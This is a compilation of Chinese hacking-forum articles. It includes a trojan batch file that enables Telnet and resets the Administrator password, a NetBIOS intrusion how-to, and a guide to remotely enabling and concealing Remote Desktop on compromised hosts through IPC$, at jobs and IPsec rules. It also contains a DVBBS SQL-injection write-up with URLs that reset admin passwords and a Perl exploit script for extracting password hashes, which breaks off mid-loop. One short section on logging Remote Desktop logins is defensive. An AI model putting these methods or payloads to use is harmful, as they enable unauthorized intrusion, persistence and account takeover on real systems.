
第三个漏洞在RTSP代理程序中，通过简单连接9090端口，提交GET命令随后打6个回车可导致proxy.nlm崩溃。

测试代码
尚无

解决方案
过滤连接21, 8225 和 9090的端口。




【端口和注册表检测】
找个好的检测工具，仔细查看内部端口到外界的访问，因为现在的木马大部分都是反弹端口式的了，是服务端连接客户端~
用tlist查看进程，用kill结束掉一些木马进程，到注册表的run,runonce...键直下删掉相关键直，到win.ini system.ini的加载位置和系统根目录看下~~~这样，一般应该OK了



【端口大全中文版】
端口大全中文版 
1　tcpmux　TCP Port Service Multiplexer　　传输控制协议端口服务多路开关选择器 
2　compressnet　Management Utility　　　　 compressnet 管理实用程序 
3　compressnet　Compression Process　　　　压缩进程 
5　rje　Remote Job Entry　　　　　　　　　 远程作业登录 
7　echo　Echo　　　　　　　　　　　　　　　回显 
9　discard　Discard　　　　　　　　　　　　丢弃 
11　systat　Active Users　　　　　　　　　 在线用户 
13　daytime　Daytime　　　　　　　　　　　 时间 
17　qotd　Quote of the Day　　　　　　　　 每日引用 
18　msp　Message Send Protocol　　　　　　 消息发送协议 
19　chargen　Character Generator　　　　　 字符发生器 
20　ftp-data　File Transfer [Default Data]　文件传输协议(默认数据口)　 
21　ftp　File Transfer [Control]　　　　　　文件传输协议(控制) 
22　ssh　SSH Remote Login Protocol　　　　 SSH远程登录协议 
23　telnet　Telnet　　　　　　　　　　　　 终端仿真协议 
24　?　any private mail system　　　　　　 预留给个人用邮件系统 
25　smtp　Simple Mail Transfer　　　　　　 简单邮件发送协议 
27　nsw-fe　NSW User System FE　　　　　　 NSW 用户系统现场工程师 
29　msg-icp　MSG ICP　　　　　　　　　　　 MSG　ICP 
31　msg-auth　MSG Authentication　　　　　 MSG验证 
33　dsp　Display Support Protocol　　　　　显示支持协议 
35　?　any private printer server　　　　　预留给个人打印机服务 
37　time　Time　　　　　　　　　　　　　　 时间 
38　rap　Route Access Protocol　　　　　　 路由访问协议 
39　rlp　Resource Location Protocol　　　　资源定位协议 
41　graphics　Graphics　　　　　　　　　　 图形 
42　nameserver　WINS Host Name Server　　　WINS 主机名服务 
43　nicname　Who Is　　　　　　　　　　　　"绰号" who is服务 
44　mpm-flags　MPM FLAGS Protocol　　　　　MPM(消息处理模块)标志协议 
45　mpm　Message Processing Module [recv]　消息处理模块　 
46　mpm-snd　MPM [default send]　　　　　　消息处理模块(默认发送口) 
47　ni-ftp　NI FTP　　　　　　　　　　　　 NI FTP 
48　auditd　Digital Audit Daemon　　　　　 数码音频后台服务　 
49　tacacs　Login Host Protocol (TACACS)　 TACACS登录主机协议 
50　re-mail-ck　Remote Mail Checking Protocol　远程邮件检查协议 
51　la-maint　IMP Logical Address Maintenance　IMP(接口信息处理机)逻辑地址维护 
52　xns-time　XNS Time Protocol　　　　　　施乐网络服务系统时间协议　　 
53　domain　Domain Name Server　　　　　　 域名服务器 
54　xns-ch　XNS Clearinghouse　　　　　　　施乐网络服务系统票据交换 
55　isi-gl　ISI Graphics Language　　　　　ISI图形语言 
56　xns-auth　XNS Authentication　　　　　 施乐网络服务系统验证 
57　?　any private terminal access　　　　 预留个人用终端访问 
58　xns-mail　XNS Mail　　　　　　　　　　 施乐网络服务系统邮件 
59　?　any private file service　　　　　　预留个人文件服务 
60　?　Unassigned　　　　　　　　　　　　　未定义 
61　ni-mail　NI MAIL　　　　　　　　　　　 NI邮件? 
62　acas　ACA Services　　　　　　　　　　 异步通讯适配器服务 
63　whois+ whois+　　　　　　　　　　　　　 WHOIS+ 
64　covia　Communications Integrator (CI)　通讯接口　 
65　tacacs-ds　TACACS-Database Service　　 TACACS数据库服务 
66　sql*net　Oracle SQL*NET　　　　　　　　Oracle SQL*NET 
67　bootps　Bootstrap Protocol Server　　　引导程序协议服务端 
68　bootpc　Bootstrap Protocol Client　　　引导程序协议客户端 
69　tftp　Trivial File Transfer　　　　　　小型文件传输协议 
70　gopher　Gopher　　　　　　　　　　　　 信息检索协议 
71　netrjs-1　Remote Job Service　　　　　 远程作业服务 
72　netrjs-2　Remote Job Service　　　　　 远程作业服务 
73　netrjs-3　Remote Job Service　　　　　 远程作业服务 
74　netrjs-4　Remote Job Service　　　　　 远程作业服务 
75　?　any private dial out service　　　　预留给个人拨出服务 
76　deos　Distributed External Object Store 分布式外部对象存储　 
77　?　any private RJE service　　　　　　预留给个人远程作业输入服务 
78　vettcp　vettcp　　　　　　　　　　　　 修正TCP? 
79　finger　Finger　　　　　　　　　　　　 FINGER(查询远程主机在线用户等信息) 
80　http　World Wide Web HTTP　　　　　　　全球信息网超文本传输协议 
81　hosts2-ns　HOSTS2 Name Server　　　　　HOST2名称服务 
82　xfer　XFER Utility　　　　　　　　　　 传输实用程序 
83　mit-ml-dev　MIT ML Device　　　　　　　模块化智能终端ML设备 
84　ctf　Common Trace Facility　　　　　　 公用追踪设备 
85　mit-ml-dev　MIT ML Device　　　　　　　模块化智能终端ML设备 
86　mfcobol　Micro Focus Cobol　　　　　　 Micro Focus Cobol编程语言 
87　?　any private terminal link　　　　　 预留给个人终端连接 
88　kerberos　Kerberos　　　　　　　　　　 Kerberros安全认证系统 
89　su-mit-tg　SU/MIT Telnet Gateway　　　 SU/MIT终端仿真网关 
90　dnsix　DNSIX Securit Attribute Token Map　DNSIX 安全属性标记图　 
91　mit-dov　MIT Dover Spooler　　　　　　 MIT Dover假脱机 
92　npp　Network Printing Protocol　　　　 网络打印协议 
93　dcp　Device Control Protocol　　　　　 设备控制协议 
94　objcall　Tivoli Object Dispatcher　　　Tivoli对象调度 
95　supdup　SUPDUP　　　　　　　　　　　　 
96　dixie　DIXIE Protocol Specification　　DIXIE协议规范 
97　swift-rvf　Swift Remote Virtural File Protocol　快速远程虚拟文件协议　 
98　tacnews　TAC News　　　　　　　　　　　TAC(东京大学自动计算机?)新闻协议 
99　metagram　Metagram Relay　　　　　　　 
100　newacct　[unauthorized use]　　　　　 
 


【简单的局域网入侵（高手勿看）】
简单的局域网入侵（高手勿看） 
新建一个文本文档，内容如下：
@echo REGEDIT4 > b.reg 
@echo [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TlntSvr] >> b.reg
@echo "Start"=dword:00000002 >> b.reg
regedit /s /c b.reg
del b.reg
net user administrator 154861
然后，将其另存为，.bat为后缀的文件。并将其与另一程序捆绑，在局域网上共享。
接下来就是等着别人上钩。
现在分析一下上面几行内容，
前三行是建一个注册表文件，起作用是修改注册表的键值，来达到系统自动启动Telnet
的目的。00000002是自动，00000003是手动，00000004是禁止启动。
regedit /s /c b.reg是将注册表文件通过后台运行导入注册表。
最后一行是将目标的Administrator的密码修改为154861。
这里我们为什么不新建一个帐户呢？
因为：
1：现在很多人用的是WINXP，并且使用欢迎界面登陆。新建帐户一眼就看出来了。
2：很多人的Aministrator是很久都不使用的，所以这就相对安全一些。
过一段时间以后，使用Superscan扫描一下网段的23端口。开了这个端口的十之八九
就是中计了。
接下来就是.............

【简单的网络入侵法】
简单的网络入侵法


1.取得对方IP地址如XX.XX.XX.XX，方法太多不细讲了。 


2.判断对方上网的地点，开个DOS窗口键入 TRACERT XX.XX.XX.XX 


第4和第5行反映的信息既是对方的上网地点。 


3.得到对方电脑的名称，开个DOS窗口键入 NBTSTAT -A XX.XX.XX.XX 


第一行是对方电脑名称 


第二行是对方电脑所在工作组 


第三行是对方电脑的说明 


4.在Windows目录下有一文件名为LMHOSTS.SAM，将其改名为LMHOSTS，删除其内容，将对方的IP及电脑名按以下格式写入文件： 


XX.XX.XX.XX 电脑名 


5.开DOS窗口键入 NBTSTAT -R 


6.在开始-查找-电脑中输入对方电脑名，出现对方电脑点击即可进入。 


以上方法请不要乱用，本人对你用上面的方法所惹出的麻烦概不负责，请慎重。 





【终端服务(3389)命令参考】
终端服务(3389)命令参考 
可以从命令提示行激活多个终端服务管理实用程序。下表列出了这些实用程序。 

命令 功能 
change logon 暂时禁止登录到终端服务器。 
change port 由于 MS-DOS 程序的兼容性而更改 COM 端口映射。 
change user 更改当前用户的 .ini 文件映射。 
cprofile 从用户配置文件中删除用户特定的文件关联。 
dbgtrace 启用或禁用调试跟踪。 
flattemp 启用或禁用平面型临时目录。 
logoff 从会话中注销用户并从服务器上删除会话。 
msg 向用户或用户组发送消息。 
query process 显示在终端服务器上运行的进程的有关信息。 
query session 显示终端服务器上的会话的有关信息。 
query termserver 显示网络上所有终端服务器的列表。 
query user 显示终端服务器上用户会话的有关信息。 
register 注册应用程序以便在系统的全局环境下执行。 
reset session 将会话重置为已知的初始值。 
shadow 监视另一用户的会话。 
tscon 连接到另一个已有的终端服务器会话。 
tsdiscon 从终端服务器会话中断开与客户机的连接。 
tskill 结束进程。 
tsprof 复制用户配置并更改配置文件路径。 
tsshutdn 关闭终端服务器。

【终端服务全攻略】
在漏洞不段出现的今天，入侵一台服务器已经不是什么新鲜事，但凡是入侵成功之后，都想尽办法来打开终端服务，什么是终端呢？又怎么在远程打开呢？看完本文，你就会成为一个开“终端的高手”。

文：终端服务全攻略 
作者：dahubaobao
主页：http://www.ringz.org 
邮件：dahushibaobao@vip.sina.com 
QQ：382690
发表于黑客防线2004年1期
工具及图片都在压缩包中，解压密码：www.ringz.org 
http://dahubaobao.go.nease.net/Terminating.rar 
欢迎进入环形区，一群技术狂热者的社区，www.ringz.org欢迎你的加入！
=====================================================================
终端服务全攻略

在漏洞不段出现的今天，入侵一台服务器已经不是什么新鲜事，但凡是入侵成功之后，都想尽办法来打开终端服务，什么是终端呢？又怎么在远程打开呢？看完本文，你就会成为一个开“终端的高手”。

什么是终端服务
3389又称Terminal Service，服务终端。在WindowsNT中最先开始使用的一种终端，在Win2K的Professional版本中不可以安装，在Server或以上版本才可以安装这个服务，其服务端口为3389。由于使用简单，方便等特点，一直受系统管理员的青昧。也正式因为他的简便，不产生交互式登陆，可以在后台操作，因此也受到了黑客朋友的喜爱，事实可以说明，现在大多数朋友在入侵之后，都想打开windows终端服务，甚至不惜重启对方的计算机，也要把终端服务安装上，由此可见他的普遍性。另，在在XP系统中又叫做“远程桌面”。

打开终端服务的各种方法
下面进入正题，开始今天的“终端”之旅。（各种工具我会提供）
一， 使用ROTS.VBS脚本
插拨广告：
1， 什么是VBS
VBScript的全称是:Microsoft Visual Basic Script Editon.(微软公司可视化BASIC脚本版). 正如其字面所透露的信息, VBS(VBScript的进一步简写)是基于Visual Basic的脚本语言. 我进一步解释一下, Microsoft Visual Basic是微软公司出品的一套可视化编程工具, 语法基于Basic. 脚本语言, 就是不编译成二进制文件, 直接由宿主(host)解释源代码并执行, 简单点说就是你写的程序不需要编译成.exe, 而是直接给用户发送.vbs的源程序, 用户就能执行了。

知道什么是VBS了，下面开始进行测试。首先你要获得这台主机的Administrator权限或Local System权限，具体怎么获得在这不必讨论。先来看看ROTS.VBS帮助.。(见图1)
ROTS v1.01
Remote Open Terminal services Script, by zzzEVAzzz
Welcome to visite www.isgrey.com 
Usage:
cscript c:\scriptpath\ROTS.vbs targetIP username password [port] [/r]
port: default number is 3389.
/r: auto reboot target.

一般的命令格式：ROTS.vbs <目标IP> <用户名> <密码> [服务端口] [自动重起选项]。

下面打开本地CMD，输入：ROTS.vbs XXX.XXX.XX.XXX dahubaobao dahu 3389 /fr

注意：
1，/fr为强制重启，/r为普通重启，不要搞混了。
2， 脚本会判断目标系统类型,如果不是server及以上版本,就会提示你是否要取消。

优点：成功率高。
缺点：必须重新启动。
二，使用批处理（bat）
open3389.bat，先来看看帮助：（见图2）
*******************Open3389*********************
使用方法：
open3389.bat ip user password
open3389.bat 目标ip 用户名 密码
还是打开CMD，输入：open3389.bat XXX.XXX.XX.XXX dahubaobao dahu

好了 就这样来打开3389，bat文件真的很好用，建议大家去学习。

优点：不必重新启动。
缺点：成功率不高。

三， 使用HBULOT
这个工具要上传到对方的机器，然后执行，比较麻烦。
C:\>net use \\XXX.XXX.XX.XXX\IPC$ "dahu" /user:"dahubaobao" //建立IPC连接
C:\>copy HBULOT.exe \\ XXX.XXX.XX.XXX \WINNT\admin$ //上传到对方的systeme32目录下。
C:\>net use \\XXX.XXX.XX.XXX\IPC$ /del //断开IPC

然后telent过去，到对方的WINNT\systeme32目录下，直接运行HBULOT.exe即可（见图
3）。 
---------------------------------------------------------------------------------------------------------------

下面介绍的不需要工具，具体请看我的方法
首先telent过去，然后输入query user，使用这个命令的前提是安装终端，如果出现如图4
的情况，就表明安装了终端。如果没有，那就证明没有安装，请看我是怎么做的：

C:\> dir c:\sysoc.inf /s //查找sysoc.inf文件的位置 
c:\WINNT\inf 的目录

2003-06-19 12:05 3,458 sysoc.inf
1 个文件 3,458 字节

C:\>dir c:\sysocmgr.* /s //查找组件安装程序
c:\WINNT\system32 的目录

1900-10-29 04:00 42,768 sysocmgr.exe
1 个文件 42,768 字节

C:\>echo [Components] > c:\ts 
C:\>echo TSEnable = on >> c:\ts
//建立无人职守安装的参数
C:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\ts /q
开启3389，并且重新启动，如果
C:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\ts /q /r
开启3389，不重新启动。

如果重新启动，那等几分钟就可以用客户端连接了，如果没重新启动，那就要等对方重新启动之后，才能连接（看你的耐心喽）。
----------------------------------------------------------------------------------


在介绍一种很方便的做法，就是做一个bat文件，在本地运行即可，下面是bat的内容
echo [Components] > c:\ts

echo TSEnable = on >> c:\ts

C:\sqlsysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\ts /q

net use \\ip\ipc$ dahu /user:dahubaobao

copy 路径:\xxx.bat \\ip\winnt\admin$

at time 00:00:00 xxx.bat

主机执行之后，会自动重启，之后就可以利用3389登陆了。

这个bat文件很容易，前两条语句是“建立无人职守安装的参数”，第三条是真正的“开启终端的命令”，第四条是“IPC连接”，第五是“把bat文件copy到对方的winnt\system32目录下”，最后是用“time获取时间，然后用at命令启动。”

（个人推荐这种方法，比较简单，有点IPC知识的就可以实现。）


修改终端服务端口
这一步很重要，我们辛苦的开启了终端服务，不能因为“3389”的暴露而前功尽弃，所以端口是必须修改的，先说一下原理，终端服务安装完成后，会在注册表中增加两个键，其键值分别为16进制的3389，即“0x00000D3D”。现在打开“运行”，输入“regedit”启动注册表编辑器，然后打开HKEY-LOCAL_MACHINE\System\CurrentControlSet\Control\TerminalServer\Wds\Repwd\Tds\Tcp和HKEY-LOCAL_MACHINE\System\CurrentControlSet\Control\TerminalServer\WinStartions\RDP-TCP子键，修改“PortNumber”，假如我们修改成8080端口，其键值为“1F90”，保存退出，注意，重启之后才能生效，修改完成之后，会到本地，打开客户端，输入：XXX.XXX.XXX.XX:8080，就可以连接了。（见图5，6）

有的朋友对注册表不熟悉，更有甚者恐惧注册表，认为是很难驾御的地方，那好办，下面介绍一个小工具，可以在命令行下修改端口，看我是怎么做的：还是先来看帮助
=======================================================
Change Local or Remote TermService Port Program
Code By wawa@21cn.Com Http://www.Haowawa.Com 
=======================================================
Local Usage: c3389 7358
Remote Usage: c3389 \\192.168.0.1 adminname password 7358

Local Host TermService Port is : 3389

本地修改：c3389 端口
远程修改：c3389 \\XXX.XXX.XXX.XX Admin用户 密码 端口

先来看本地修改：
打开CMD。输入c3389 post，具体见图7。

在来看远程修改：
输入c3389 \\XXX.XXX.XXX.XX adminname password post。

到这里，端口就修改关闭了。

隐藏上次登陆过的用户名
在终端安装完成后，并且你已经登陆过，那么再次登陆就会显示上次登陆过的用户名，如果我们添加的帐户（或克隆）被管理员看到了，那不起疑心才怪呢？所以我们要隐藏登陆过的用户，要实现隐藏，还是要修改注册表，具体看我怎么做：在“运行”中输入“regedit”启动注册表编辑器，依次展开：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon子键下的DontDisplayLastUserName，默认键值为“0”，我们修改为“1”，保存，退出，重新启动之后生效。见图8


限制/指定连接终端的地址
现在我们已经给肉鸡看了终端，并且修改了端口，还做了一些简单的维护，但这还是不够的，假如某人知道了我们修改过的端口就是终端服务，那就挂了，所以还要在肉鸡上通过IPSEC这个系统自带的而且功能非常强大的工具来做一下限制，具体请看我的演示：

1，静态IP
假如我的IP是111.222.255.255，我们通过设置IPSEC，来让肉鸡上的终端只通过我的连接，而拒绝除了我以外的所有连接，好，就这么办，先登陆终端，然后打开“管理工具”―“本地安全设置”，设置如下：

首先右键点击“IP安全策略 在本地机器”选择“创建IP策略”，然后打开了一个向导，即“IP安全策略向导”―“下一步”―“名称”―“下一步”取消“激活默认响应规则”―“下一步”―“完成”，这是会重新打开一个“新IP安全策略 属性”（见图9），取消“使用“添加向导””―“添加”―出现“新规则属性”―“添加”―出现“IP筛选器列表”―取消“使用“添加向导””―“添加”―出现“筛选器 属性”，选择“寻址”标签，源地址设为‘任何IP地址’，目的地址设为‘我的IP地址’；在选择“协议”标签，选择协议类型设为‘TCP’，设置IP协议端口‘从任意端口’―‘到此端口8080’―“确定”（见图10，11）--“关闭”―回到“新规则 属性”―选择“新IP筛选器列表”―在选“筛选器操作”标签―取消“使用“添加向导””―“添加”―在“安全措施”标签下选择“阻止”―“确定”―“关闭”（见图12），回到“新规则 属性”―选中“新筛选器操作”―“关闭”―“关闭”―回到“本地安全设置”―选中“新IP安全策略”―右键点击“指派”（见图13），好了，总算设置完了，这样所有的机器就无法连接8080（终端）端口了。

注意：以上都是使用默认的名称，所以大家在设置的时候注意一下。

由于上边的设置，把我自己也挡在了外面，这可不是我所想要的，所以，我们还要建立一条规则，允许我的IP 111.222.255.255访问对方的8080端口，方法如下：

右键点击“新IP安全策略”―“属性”―不选“使用“添加向导””―出现“新规则 属性”―“添加”―出现“IP筛选器列表”―不选“使用“添加向导””―“添加”―出现“筛选器 属性”―选择“寻址”标签，设置成如图14的样子，在选择“协议”标签，设置成如图12的样子，然后“确定”―“关闭”―回到“新规则 属性”―选中“新IP筛选器列表（1）”―在选“筛选器操作”标签―在选“允许”―“关闭”―“关闭”―回到“本地安全设置”。
（见图15）

2，动态IP

在中国，拥有静态IP的人毕竟是少数，大多数朋友还都是拨号，虽然现在ADSL很普遍，但ADSL还是虚拟拨号，即动态IP，所以用上边的方法设置IPSEC肯定是不行的，所以，现在我们要修改上边的一条规则，使IPSEC可以通过 特定子网的连接，方法很简单，其他的都不用改，按照图16的方法设置就可以了。


【终端服务的日志监控】
终端服务的日志监控
　　单独将终端服务（Terminal Service）的日志监控分列出来是有原因的，微软Win2000服务器版中自带的终端服务Terminal Service是一个基于远程桌面协议（RDP）的工具，它的速度非常快，也很稳定，可以成为一个很好的远程管理软件，但是因为这个软件功能强大而且只受到密码的保护，所以也非常的危险，一旦入侵者拥有了管理员密码，就能够像本机一样操作远程服务器。虽然很多人都在使用终端服务来进行远程管理，但是，并不是人人都知道如何对终端服务进行审核。大多数的终端服务器上并没有打开终端登录的日志。其实打开日志审核是很容易的，在管理工具中打开远程控制服务配置（Terminal Service Configration），点击“连接”，右击你想配置的RDP服务（比如RDP-TCP Microsoft RDP 5.0），选中书签“权限”，点击左下角的“高级”，看见上面那个“审核”了么？我们来加入一个Everyone组，这代表所有的用户，然后审核它的“连接”、“断开”、“注销”的成功和“登录”的成功和失败就足够了。审核太多了反而不好，这个审核是记录在安全日志中的，可以从“管理工具”→“日志查看器”中查看。现在什么人什么时候登录我都一清二楚了，可是美中不足的是：这个破烂玩艺居然不记录客户端的IP（只能查看在线用户的IP），而是华而不实地记录什么机器名，倒！要是别人起个PIG的机器名你只好受他的嘲弄了，不知道微软是怎么想的，看来还是不能完全依赖微软呀，我们自己来吧，写个程序，一切搞定，你会C么？不会？VB呢？也不会？Delphi？……什么？你什么编程语言都不会？我倒，毕竟系统管理员不是程序员呀，别急别急，我给你想办法，我们来建立一个bat文件，叫做TSLog.bat。这个文件用来记录登录者的IP，内容如下：time /t >>TSLog.log netstat -n -p tcp ｜ find “:3389”>>TSLog.logstart Explorer。我来解释一下这个文件的含义：第一行是记录用户登录的时间，time /t的意思是直接返回系统时间（如果不加/t，系统会等待你输入新的时间），然后我们用追加符号“>>”把这个时间记入TSLog.log作为日志的时间字段；第二行是记录用户的IP地址，netstat是用来显示当前网络连接状况的命令，-n表示显示IP和端口而不是域名、协议，-ptcp是只显示tcp协议，然后我们用管道符号“｜”把这个命令的结果输出给find命令，从输出结果中查找包含“3389”的行（这就是我们要的客户的IP所在的行，如果你更改了终端服务的端口，这个数值也要作相应的更改）。最后我们同样把这个结果重定向到日志文件TSLog.log中去，于是在TSLog.log文件中，记录格式如下：
　　22:40 TCP　192.168.12.28:3389
　　192.168.10.123:4903　ESTABLISHED 22:54 TCP　192.168.12.28:338
　　192.168.12.29:1039　ESTABLISHED也就是说只要这个TSLog.bat文件一运行，所有连在3389端口上的IP都会被记录，那么如何让这个批处理文件自动运行呢？我们知道，终端服务允许我们为用户自定义起始的程序，在终端服务配置中，我们覆盖用户的登录脚本设置并指定TSLog.bat为用户登录时需要打开的脚本，这样每个用户登录后都必须执行这个脚本，因为默认的脚本（相当于shell环境）是Explorer（资源管理器），所以我在TSLog.bat的最后一行加上了启动Explorer的命令start Explorer。如果不加这一行命令，用户是没有办法进入桌面的！当然，如果你只需要给用户特定的shell，例如:cmd.exe或者word.exe你也可以把start Explorer替换成任意的shell。这个脚本也可以有其他的写法，作为系统管理员，你完全可以自由发挥你的想象力、自由利用自己的资源，例如，写一个脚本把每个登录用户的IP发送到自己的信箱，对于重要的服务器也是一个很好的方法。正常情况下一般的用户没有查看终端服务设置的权限，所以他不会知道你对登录进行了IP审核，只要把TSLog.bat文件和TSLog.log文件放在比较隐蔽的目录里就足够了。不过，需要注意的是这只是一个简单的终端服务日志策略，并没有太多的安全保障措施和权限机制。如果服务器有更高的安全要求，那还是需要通过编程或购买入侵监测软件来完成的。

【绝对背后的微笑】
>>>Dedicated This Scrap To CaoJing & GuTing<<<

Envymask的睿智帮我解决了很多问题，尽管是兄弟，我还是要说谢谢。

很吃惊地看到了DVBBS发布的安全补丁，原来有人提醒了作者程序所存在的一类漏洞。可以看出，作者对DVBBS做了全面检测，并且在消除那一类漏洞的同时，也顺带消除了其他几个安全隐患。看到自己曾耗费数小时换来的“劳动成果”被作者解决，心中有点不快。

有人、文章错误地认为：动网即使存在漏洞，也只能真正威胁MSSQL版；而ACCESS版的用户敏感信息MD5加密和后台管理的SESSION+COOKIE验证则让大家认为它牢不可破：“顶多让你得到MD5加密后的密码，你还能做什么呢？”、“我们只有暴力破解”、“动网已经是非常安全的程序了”...在一个失落的清晨，我偶然发现了这位亲爱的朋友，她静静地站在绝对的背后，微笑...

因此，本文展示如何攻破“所谓安全”的ACCESS版DVBBS；由于MSSQL版的漏洞利用简单乏味，拒绝介绍。另外，请相关朋友速打补丁。

攻击分两步，首先得到管理员MD5加密的敏感信息，接着在此基础上更改后台管理员密码。

一：得到任意用户MD5加密的敏感信息
可以利用 logout.asp、messanger.asp、myfile.asp...等一大批文件所存在的Sql Injection漏洞达到目的。这些漏洞文件中logout.asp让我稍感新意，选它来说明问题：
logout.asp:
/--------------------------------------------------------------------------
<!--#include file="conn.asp"-->

<!--#include file="inc/const.asp"-->

<%
dim activeuser
membername=request.cookies("aspsky")("username")
if session("userid")<>"" then
activeuser="delete from online where id="&session("userid")
Conn.Execute activeuser
end if
if membername<>"" then
activeuser="delete from online where username='"&membername&"'"
Conn.Execute activeuser
end if
Response.Cookies("aspsky").path=cookiepath
Response.Cookies("aspsky")("username")=""
Response.Cookies("aspsky")("password")=""
Response.Cookies("aspsky")("userclass")=""
Response.Cookies("aspsky")("userid")=""
Response.Cookies("aspsky")("userhidden")=""
Response.Cookies("aspsky")("usercookies")=""
session("userid")=""
conn.close
set conn=nothing
response.redirect("index.asp")
%>
/--------------------------------------------------------------------------
问题语句： activeuser="delete from online where username='"&membername&"'"
很多人会问：这也能利用？
能！
步骤：
1：注册一用户并登陆；
2：在COOKIE中构造membername请求logout.asp，以图程序所执行的SQL查询语句中包含我们利用逻辑关系添加的子语句；
3：构造参数请求主页面，如返回页面包含用户注册名，重复第 2 步；
4：得到敏感信息。

测试程序附后。

二：闯入后台管理
我们已经得到管理员MD5加密的敏感信息，现在可以利用COOKIE欺骗可以在前台执行管理员操作。如果你依然坚持暴力破解，并认为这很有趣，你可以停止阅读本文了。

鄙视暴力破解。不是说不现实，而是说这很乏味。

admin_recycle.asp
/--------------------------------------------------------------------------
...
topicid=request("topicid")
if request("action")<>"清空回收站" then
if topicid="" or isnull(topicid) then
Errmsg=Errmsg+"<li>"+"请选择相关帖子后进行操作。"
Founderr=true
end if
end if
if request("tablename")="topic" then
tablename="topic"
elseif instr(request("tablename"),"bbs")>0 then
tablename=request("tablename")
else
Errmsg=Errmsg+"<li>"+"错误的系统参数！"
Founderr=true
end if
if not master then
Errmsg=Errmsg+"<li>"+"您不是系统管理员或者您还没有登陆。"
Founderr=true
end if
...
'还原回收站内容
sub redel()
dim tempnum,todaynum
if instr(tablename,"bbs")>0 then
sql="update "&tablename&" set locktopic=0 where Announceid in ("&TopicID&")"
conn.execute(sql)
...
/--------------------------------------------------------------------------
问题：
1：未采用SESSION认证
2：topicid没有过滤
3：仅要求tablename包含bbs而不采取其他任何过滤（目前依然未修正）

Tablename和TopicID前后呼应，真是天合之作。提交

http://www.psych.com/d6/admin_recycle.asp?action=还原&topicid='%20where%20id%20in%20(9&tablename=admin%20set%20[password]='ef7813118e77b0ee',lastloginip='bbs

实际执行的是

update admin set [password]='ef7813118e77b0ee', lastloginip='bbs set locktopic=0 where Announceid in (' where id in (9)

这样，ID为 9 的后台管理员的密码就被修改为 ilikecat (ef7813118e77b0ee)。

提交如上URL后，页面会返回出错提示。这是因为后面的SQL语句有语法错误，别管它，我们要求执行的语句已经在它之前“正确”执行了。

注意：前台管理员和后台管理员是一一对应的，弄错了不能正确登陆后台。为了省事，你可以：

http://www.psych.com/d6/admin_recycle.asp?action=还原&topicid='%20where%20(1=1&tablename=admin%20set%20[password]='ef7813118e77b0ee',lastloginip='bbs

所有后台管理员密码修改为 ilikecat (ef7813118e77b0ee)

http://www.psych.com/d6/admin_recycle.asp?action=还原&topicid='%20where%20(1=1&tablename=admin%20set%20username='catlikeme',lastloginip='bbs

所有后台管理员用户名修改为 catlikeme 

当然，最好不要无聊到把所有注册用户的帐号和密码全修改了。

OK，本地COOKIE做些处理后，劳请使用 catlikeme/ilikecat 登陆后台进行“管理”。

/--------------------[获取任意用户MD5加密信息的测试程序：

#!/usr/bin/perl
#Codz By PsKey<PsKey@hotmail.com>
#Exploit of DVBBS's logout.asp

#-------------------------------------------------------------------------- 
# 本脚本针对动网论坛logout.asp文件缺陷而写，可以推算出所有用户
# MD5加密密码；另外可以自动破解后台管理员ID、username、password
# 脚本参照最新版本编写，若低版本出现不能用的情况，请自行修改程序
# 脚本利用方法：
# 1：在目标论坛以 ilikecat/catlikeme 注册一用户，并得到此用户的 userid
# 2：再另注册一任意用户(此步不可少)
# 3：运行脚本，按帮助输入命令参数
# 如果是MSSQL版，请把这段糟糕的脚本扔到一边
#--------------------------------------------------------------------------

$|=1;
use Socket;
use Getopt::Std;
getopt('hpwium');

print "\n ===================================================\n";
print " Exploit of DVBBS's logout.asp\n";
print " Codz By PsKey<PsKey\@hotmail.com> \n";
print " www.isgrey.com && c4st.51.net \n";
print " Thanx Envymask<130\@21cn.com> \n";
print " ===================================================\n";

&usage unless ( defined($opt_h) && defined($opt_w) && defined($opt_i) && defined($opt_m));

$host=$opt_h;
$port=$opt_p||80;
$path=$opt_w;
$userid=$opt_i;
$user=$opt_u;
$mode=$opt_m;

if ($opt_m eq "p") {
&usage unless defined($opt_u);
print "\nPlease wait...\n\n";
for ($j=1;$j<=16;$j++) {
@dic1=(0..9);
@dic2=(a..f);
@dic=(@dic1,@dic2);
&first;
for ($i=0;$i<@dic;$i++) {
print "$dic[$i]";
$key=$pws.$dic[$i];
$target = "ilikecat'%20and%20exists%20(select%20UserID%20from%20[user]%20where%20UserName='$user'%20and%20left(UserPassword,$j)='$key')%20and%20'1'='1";
&second;
if ("@in" !~ /ilikecat/) {
$th=$j.th;
print "\n\/\/------------The $th word of the password is $dic[$i]";
$pws=$pws.$dic[$i];
last;
}
}
}
print "\n\nSuccessful,the full password of $user is $pws.\n";
}

elsif ($opt_m eq "b") { 

#Crack ID
print "\n\#\#\#\#\#\#\#\#\#\#\#Start cracking admin's id...";
&first;
for ($i=0;$i<=50;$i++) {
$target = "ilikecat'%20and%20exists%20(select%20id%20from%20[admin]%20where%20id=$i)%20and%20'1'='1";
&second;
if ("@in" !~ /ilikecat/) {
print "\n--------->>There is one admin's id $i";
push (@id,$i);
&first;
}
}
print "\n\#\#\#\#\#\#\#\#\#\#\#End cracking admin's id...\n";
sleep(2);

#Crack the length of admin's username
print "\n\#\#\#\#\#\#\#\#\#\#\#Start Cracking the length of admin's username...\n";
for ($j=0;$j<@id;$j++) {
print " \|\-\>cracking username's length which id is $id[$j] ...";
&first;
for ($i=0;$i<=50;$i++) {
$target = "ilikecat'%20and%20exists%20(select%20id%20from%20[admin]%20where%20len(username)=$i%20and%20id=$id[$j])%20and%20'1'='1";
&second;
if ("@in" !~ /ilikecat/) {
print "\n--------->>The length of $id[$j] is $i";
push (@len,$i);
&first;
last;
}
}
}
print "\n\#\#\#\#\#\#\#\#\#\#\#End Cracking the length of admin's username...\n";
sleep(2);

#Crack admin's username
print "\n\#\#\#\#\#\#\#\#\#\#\#Start Crackadmin's username...\n";
@dic1=(0..9);
@dic2=(a..z);
@dic=(@dic1,@dic2);
for ($j=0;$j<@id;$j++) {
$pws="";
print " \|\-\>cracking username which id is $id[$j] ...";
OUTER: for ($k=1;$k<=$len[$j];$k++) {
&first;
USERNAME: for ($i=0;$i<@dic;$i++) {
print "$dic[$i].";
$key=$pws.$dic[$i];
